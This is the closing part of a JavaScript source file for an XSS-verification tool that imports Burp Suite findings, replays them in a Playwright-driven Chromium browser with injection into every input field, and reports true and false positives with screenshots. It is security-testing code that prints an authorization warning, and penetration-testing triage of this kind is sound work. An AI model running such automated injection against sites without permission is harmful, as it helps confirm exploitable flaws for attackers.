  console.log('');
  console.log(log.color('96', '+-------------------------------------------------------------------------------+'));
  console.log(log.color('96', '|     Burp XML XSS Playwright Checker v8 - All Inputs | Auto Limit Removal      |'));
  console.log(log.color('96', '|     Real HTTP Capture | All Headers | Smart Status | Multi-Input Injection     |'));
  console.log(log.color('96', '+-------------------------------------------------------------------------------+'));
  console.log('');

  log.warn('Run only against systems where you have explicit authorization.');
  log.info(`XML input: ${args.xml}`);
  log.info(`Screenshot directory: ${args.out}`);
  log.info(`XML output: ${args.results}`);
  if (args.payloads) log.info(`Payloads file: ${args.payloads}`);
  else log.info(`Using default payloads (no ${DEFAULT_PAYLOADS_FILE} found)`);
  if (args.allInputs) log.info('ALL INPUTS mode: ENABLED - Will inject into every field');
  if (args.saveHttp) log.info('HTTP capture: ENABLED (all headers will be saved)');
  if (args.domDeep) log.info('Deep DOM analysis: ENABLED');
  if (args.strictFp) log.info('Strict false-positive filtering: ENABLED');
  if (args.verifyUrls.length) log.info(`Verify URLs: ${args.verifyUrls.join(', ')}`);

  const xml = readBurpXml(args.xml);
  const findings = extractFindings(xml, args);

  if (!findings.length) {
    log.warn('No XSS findings found in Burp XML.');
    process.exit(1);
  }

  log.ok(`Extracted ${findings.length} XSS finding(s)`);

  for (const finding of findings) {
    log.info(`Finding ${finding.id}: [${finding.xssType}] ${finding.method} ${finding.url.substring(0, 100)}... param='${finding.parameter}'`);
  }

  const browser = await chromium.launch({
    headless: !args.headful,
  });

  const results = [];
  let hasRealHttpData = false;

  try {
    for (let i = 0; i < findings.length; i++) {
      const result = await runFinding(browser, findings[i], args, log);
      results.push(result);

      if (result.attempts.some(a => a.request || a.response)) {
        hasRealHttpData = true;
      }

      const f = result.finding;
      if (result.classification === 'TRUE_POSITIVE') {
        log.tp(`\n[OK][OK][OK] Finding ${f.id}: TRUE POSITIVE (${f.xssType}) [OK][OK][OK]\n`);
      } else if (result.classification === 'MANUAL_REVIEW_REQUIRED') {
        log.manual(`\n[MR][MR][MR] Finding ${f.id}: MANUAL REVIEW REQUIRED (${f.xssType}) [MR][MR][MR]`);
        log.manual(`    ${result.classificationReason}\n`);
      } else if (result.classification === 'FALSE_POSITIVE') {
        log.fp(`\n[FP] Finding ${f.id}: FALSE POSITIVE (${f.xssType})\n`);
      } else if (result.classification === 'STORED_XSS_UNCLEAR') {
        log.storedNotFound(`\n[SN] Finding ${f.id}: STORED XSS UNCLEAR (${f.xssType})\n`);
      } else {
        log.err(`\n[ER] Finding ${f.id}: ${result.classification}\n`);
      }
    }
  } finally {
    await browser.close();
  }

  const summary = {
    totalFindings: results.length,
    truePositives: results.filter((r) => r.classification === 'TRUE_POSITIVE').length,
    falsePositives: results.filter((r) => r.classification === 'FALSE_POSITIVE').length,
    manualReviewRequired: results.filter((r) => r.classification === 'MANUAL_REVIEW_REQUIRED').length,
    storedXssUnclear: results.filter((r) => r.classification === 'STORED_XSS_UNCLEAR').length,
    technicalErrors: results.filter((r) => r.classification === 'TECHNICAL_ERROR').length,
    truePositiveRatePercent: results.length ? (results.filter(r => r.classification === 'TRUE_POSITIVE').length / results.length * 100).toFixed(2) : 0,
  };

  const report = {
    generatedAt: new Date().toISOString(),
    hasRealHttpData,
    summary,
    results,
  };

  fs.writeFileSync(args.results, generateXml(report), 'utf8');

  console.log('');
  console.log(log.color('96', '+-------------------------------------------------------------------------------+'));
  console.log(log.color('96', '|  SUMMARY                                                                      |'));
  console.log(log.color('96', '+-------------------------------------------------------------------------------+'));
  console.log(log.color('96', `|  Total Findings:          ${String(summary.totalFindings).padEnd(51)}|`));
  console.log(log.color('92', `|  [OK] True Positives:        ${String(summary.truePositives).padEnd(51)}|`));
  console.log(log.color('94', `|  [MR] Manual Review Needed:  ${String(summary.manualReviewRequired).padEnd(51)}|`));
  console.log(log.color('93', `|  [SN] Stored XSS Unclear:    ${String(summary.storedXssUnclear).padEnd(51)}|`));
  console.log(log.color('35', `|  [FP] False Positives:       ${String(summary.falsePositives).padEnd(51)}|`));
  console.log(log.color('31', `|  [ER] Technical Errors:      ${String(summary.technicalErrors).padEnd(51)}|`));
  console.log(log.color('96', `|  Real HTTP Data:          ${String(hasRealHttpData ? 'YES' : 'NO').padEnd(51)}|`));
  console.log(log.color('96', '+-------------------------------------------------------------------------------+'));

  log.ok(`\n[REPORT] XML report written to ${args.results}`);
  log.ok(`[SS] Screenshots saved to ${args.out}`);

  if (summary.manualReviewRequired > 0) {
    log.manual(`\n[MR] ${summary.manualReviewRequired} finding(s) require MANUAL REVIEW.`);
    log.manual(`   These have payloads in executable context but no dialog fired.`);
    log.manual(`   Check screenshots and CSP headers to determine if XSS is possible.`);
  }
}

main().catch((err) => {
  console.error(`\n[-] Fatal error: ${err.stack || err.message || err}`);
  process.exit(1);
});
